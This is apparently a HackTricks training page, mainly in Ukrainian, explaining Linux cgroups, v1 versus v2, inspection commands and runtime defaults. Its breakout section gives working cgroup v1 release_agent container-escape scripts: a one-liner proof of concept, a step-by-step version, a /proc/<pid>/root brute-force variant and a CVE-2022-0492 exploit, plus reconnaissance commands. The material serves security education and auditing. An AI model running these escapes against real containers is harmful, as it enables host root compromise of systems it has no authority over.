# cgroups

{{#include ../../../../banners/hacktricks-training.md}}

## Огляд

Linux **control groups** — це механізм ядра, що використовується для групування процесів задля обліку, обмежень, пріоритезації та застосування політик. Якщо namespaces здебільшого ізолюють уявлення про ресурси, то cgroups здебільшого визначають, **скільки** з цих ресурсів може споживати набір процесів і, в окремих випадках, **з якими класами ресурсів** вони взагалі можуть взаємодіяти. Containers постійно покладаються на cgroups, навіть коли користувач ніколи не дивиться на них безпосередньо, бо майже кожен сучасний runtime потребує способу повідомити ядру "ці процеси належать цьому workload, і до них застосовуються такі правила щодо ресурсів".

Саме тому container engines поміщають новий container у власне cgroup subtree. Коли дерево процесів опиняється там, runtime може обмежувати пам'ять, лімітувати кількість PIDs, змінювати вагу використання CPU, регулювати I/O та обмежувати доступ до пристроїв. У production-середовищі це необхідно як для безпеки multi-tenant, так і для простої операційної гігієни. Container без осмислених контролів ресурсів може виснажити пам'ять, заповнити систему процесами або монополізувати CPU і I/O таким чином, що host або сусідні workloads стануть нестабільними.

З точки зору безпеки, cgroups важливі двома окремими способами. По-перше, неправильні або відсутні ліміти ресурсів дають змогу виконати прості denial-of-service атаки. По-друге, деякі можливості cgroup, особливо в старих конфігураціях **cgroup v1**, історично створювали потужні breakout primitives, коли вони були записуваними зсередини container.

## v1 Vs v2

Існує два основні моделі cgroup у природі. **cgroup v1** відкриває кілька ієрархій контролерів, і старі exploit writeups часто крутяться навколо дивних і іноді надто потужних семантик, доступних там. **cgroup v2** вводить більш уніфіковану ієрархію та загалом чистішу поведінку. Сучасні дистрибутиви все частіше віддають перевагу cgroup v2, але змішані або legacy середовища все ще існують, тому обидві моделі залишаються релевантними при огляді реальних систем.

Різниця важлива, бо деякі з найвідоміших історій про container breakout, наприклад зловживання **`release_agent`** у cgroup v1, дуже конкретно пов'язані зі старою поведінкою cgroup. Читач, який бачить cgroup exploit у блозі та потім бездумно застосовує його до сучасної системи тільки з cgroup v2, ймовірно, неправильно зрозуміє, що дійсно можливо на цільовій системі.

## Інспекція

Найшвидший спосіб побачити, в якій cgroup знаходиться ваша поточна shell, це:
```bash
cat /proc/self/cgroup
findmnt -T /sys/fs/cgroup
```
Файл `/proc/self/cgroup` показує шляхи cgroup, пов'язані з поточним процесом. На сучасному хості з cgroup v2 ви часто побачите об'єднаний запис. На старіших або гібридних хостах ви можете побачити кілька шляхів контролерів v1. Як тільки ви знаєте шлях, ви можете переглянути відповідні файли під `/sys/fs/cgroup`, щоб побачити ліміти та поточне використання.

На хості з cgroup v2 наступні команди будуть корисні:
```bash
ls -l /sys/fs/cgroup
cat /sys/fs/cgroup/cgroup.controllers
cat /sys/fs/cgroup/cgroup.subtree_control
```
Ці файли показують, які контролери існують і які з них делеговані дочірнім cgroups. Ця модель делегування має значення в rootless та systemd-managed середовищах, де runtime може контролювати лише підмножину функціональності cgroup, яку фактично делегує батьківська ієрархія.

## Лабораторія

Один зі способів спостерігати cgroups на практиці — запустити контейнер зі обмеженням пам'яті:
```bash
docker run --rm -it --memory=256m debian:stable-slim bash
cat /proc/self/cgroup
cat /sys/fs/cgroup/memory.max 2>/dev/null || cat /sys/fs/cgroup/memory.limit_in_bytes 2>/dev/null
```
Ви також можете спробувати PID-обмежений контейнер:
```bash
docker run --rm -it --pids-limit=64 debian:stable-slim bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
```
These examples are useful because they help connect the runtime flag to the kernel file interface. The runtime is not enforcing the rule by magic; it is writing the relevant cgroup settings and then letting the kernel enforce them against the process tree.

## Runtime Usage

Docker, Podman, containerd, and CRI-O all rely on cgroups as part of normal operation. The differences are usually not about whether they use cgroups, but about **which defaults they choose**, **how they interact with systemd**, **how rootless delegation works**, and **how much of the configuration is controlled at the engine level versus the orchestration level**.

In Kubernetes, resource requests and limits eventually become cgroup configuration on the node. The path from Pod YAML to kernel enforcement passes through the kubelet, the CRI runtime, and the OCI runtime, but cgroups are still the kernel mechanism that finally applies the rule. In Incus/LXC environments, cgroups are also heavily used, especially because system containers often expose a richer process tree and more VM-like operational expectations.

## Misconfigurations And Breakouts

The classic cgroup security story is the writable **cgroup v1 `release_agent`** mechanism. In that model, if an attacker could write to the right cgroup files, enable `notify_on_release`, and control the path stored in `release_agent`, the kernel could end up executing an attacker-chosen path in the initial namespaces on the host when the cgroup became empty. That is why older writeups place so much attention on cgroup controller writability, mount options, and namespace/capability conditions.

Even when `release_agent` is not available, cgroup mistakes still matter. Overly broad device access can make host devices reachable from the container. Missing memory and PID limits can turn a simple code execution into a host DoS. Weak cgroup delegation in rootless scenarios can also mislead defenders into assuming a restriction exists when the runtime was never actually able to apply it.

### `release_agent` Background

The `release_agent` technique only applies to **cgroup v1**. The basic idea is that when the last process in a cgroup exits and `notify_on_release=1` is set, the kernel executes the program whose path is stored in `release_agent`. That execution happens in the **initial namespaces on the host**, which is what turns a writable `release_agent` into a container escape primitive.

For the technique to work, the attacker generally needs:

- a writable **cgroup v1** hierarchy
- the ability to create or use a child cgroup
- the ability to set `notify_on_release`
- the ability to write a path into `release_agent`
- a path that resolves to an executable from the host point of view

### Classic PoC

The historical one-liner PoC is:
```bash
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p "$d/w"
echo 1 > "$d/w/notify_on_release"
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
touch /o
echo "$t/c" > "$d/release_agent"
cat <<'EOF' > /c
#!/bin/sh
ps aux > "$t/o"
EOF
chmod +x /c
sh -c "echo 0 > $d/w/cgroup.procs"
sleep 1
cat /o
```
Цей PoC записує шлях до payload у `release_agent`, ініціює звільнення cgroup, а потім читає назад файл виводу, створений на хості.

### Покрокове пояснення

Ту саму ідею легше зрозуміти, якщо розбити її на кроки.

1. Створіть та підготуйте cgroup з правом запису:
```bash
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp    # or memory if available in v1
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```
2. Визначте шлях на хості, який відповідає файловій системі контейнера:
```bash
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
3. Помістіть payload, який буде видимий з шляху хоста:
```bash
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > /output
EOF
chmod +x /cmd
```
4. Запустіть виконання, зробивши cgroup порожнім:
```bash
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
sleep 1
cat /output
```
Ефект — виконання payload на стороні host з привілеями host root. У реальному exploit payload зазвичай записує proof file, створює reverse shell або змінює стан host.

### Relative Path Variant Using `/proc/<pid>/root`

У деяких середовищах шлях на host до container filesystem неочевидний або прихований storage driver. У такому випадку шлях payload можна виразити через `/proc/<pid>/root/...`, де `<pid>` — host PID, що належить процесу в поточному container. Це — основа relative-path brute-force variant:
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

sleep 10000 &

cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh
OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
ps -eaf > \${OUTPATH} 2>&1
__EOF__

chmod a+x ${PAYLOAD_PATH}

mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID}"
exit 1
fi
fi
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

sleep 1
cat ${OUTPUT_PATH}
```
Релевантний трюк тут — не brute force сам по собі, а форма шляху: `/proc/<pid>/root/...` дозволяє kernel звертатися до файлу всередині файлової системи контейнера з host namespace, навіть коли прямий шлях на host storage невідомий наперед.

### CVE-2022-0492 Варіант

У 2022 році CVE-2022-0492 показав, що запис у `release_agent` в cgroup v1 не перевіряв коректно наявність `CAP_SYS_ADMIN` у **initial** user namespace. Це зробило техніку значно доступнішою на вразливих kernel, бо процес у контейнері, який міг змонтувати ієрархію cgroup, міг записати в `release_agent` без попередніх привілеїв у host user namespace.

Мінімальний експлойт:
```bash
apk add --no-cache util-linux
unshare -UrCm sh -c '
mkdir /tmp/c
mount -t cgroup -o memory none /tmp/c
echo 1 > /tmp/c/notify_on_release
echo /proc/self/exe > /tmp/c/release_agent
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
На вразливому ядрі хост виконує `/proc/self/exe` з привілеями root хоста.

Для практичного зловживання почніть з перевірки, чи середовище все ще надає записувані шляхи cgroup-v1 або небезпечний доступ до пристроїв:
```bash
mount | grep cgroup
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null -exec ls -l {} \;
find /sys/fs/cgroup -maxdepth 3 -writable 2>/dev/null | head -n 50
ls -l /dev | head -n 50
```
Якщо `release_agent` присутній і доступний для запису, ви вже у зоні legacy-breakout:
```bash
find /sys/fs/cgroup -maxdepth 3 -name notify_on_release 2>/dev/null
find /sys/fs/cgroup -maxdepth 3 -name cgroup.procs 2>/dev/null | head
```
Якщо сам шлях cgroup не дає escape, наступним практичним використанням часто є denial of service або reconnaissance:
```bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
cat /sys/fs/cgroup/memory.max 2>/dev/null
cat /sys/fs/cgroup/cpu.max 2>/dev/null
```
Ці команди швидко покажуть, чи має робоче навантаження можливість виконати fork-bomb, агресивно споживати пам'ять або зловживати writable legacy cgroup interface.

## Перевірки

Під час огляду цілі метою перевірок cgroup є дізнатися, яка cgroup модель використовується, чи бачить container writable controller paths, і чи старі breakout primitives, такі як `release_agent`, взагалі актуальні.
```bash
cat /proc/self/cgroup                                      # Current process cgroup placement
mount | grep cgroup                                        # cgroup v1/v2 mounts and mount options
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null   # Legacy v1 breakout primitive
cat /proc/1/cgroup                                         # Compare with PID 1 / host-side process layout
```
Що тут цікаво:

- Якщо `mount | grep cgroup` показує **cgroup v1**, старіші breakout writeups стають більш релевантними.
- Якщо `release_agent` існує і до нього можна дістатися, це заслуговує негайного глибшого розслідування.
- Якщо видима ієрархія cgroup є записуваною і контейнер також має сильні capabilities, середовище потребує набагато ретельнішого огляду.

Якщо ви виявите **cgroup v1**, writable controller mounts, і контейнер, який також має сильні capabilities або слабкий захист seccomp/AppArmor, така комбінація заслуговує на пильну увагу. cgroups часто сприймають як нудну тему управління ресурсами, але історично вони були частиною деяких із найповчальніших container escape chains саме тому, що межа між "resource control" і "host influence" не завжди була такою чистою, як вважали люди.

## Параметри середовища виконання за замовчуванням

| Runtime / platform | Стан за замовчуванням | Поведінка за замовчуванням | Звичне ручне послаблення |
| --- | --- | --- | --- |
| Docker Engine | Enabled by default | Containers are placed in cgroups automatically; resource limits are optional unless set with flags | omitting `--memory`, `--pids-limit`, `--cpus`, `--blkio-weight`; `--device`; `--privileged` |
| Podman | Enabled by default | `--cgroups=enabled` is the default; cgroup namespace defaults vary by cgroup version (`private` on cgroup v2, `host` on some cgroup v1 setups) | `--cgroups=disabled`, `--cgroupns=host`, relaxed device access, `--privileged` |
| Kubernetes | Enabled through the runtime by default | Pods and containers are placed in cgroups by the node runtime; fine-grained resource control depends on `resources.requests` / `resources.limits` | omitting resource requests/limits, privileged device access, host-level runtime misconfiguration |
| containerd / CRI-O | Enabled by default | cgroups are part of normal lifecycle management | direct runtime configs that relax device controls or expose legacy writable cgroup v1 interfaces |

Важлива відмінність полягає в тому, що **існування cgroup** зазвичай включено за замовчуванням, тоді як **корисні обмеження ресурсів** часто є опційними, якщо їх явно не налаштовано.
{{#include ../../../../banners/hacktricks-training.md}}
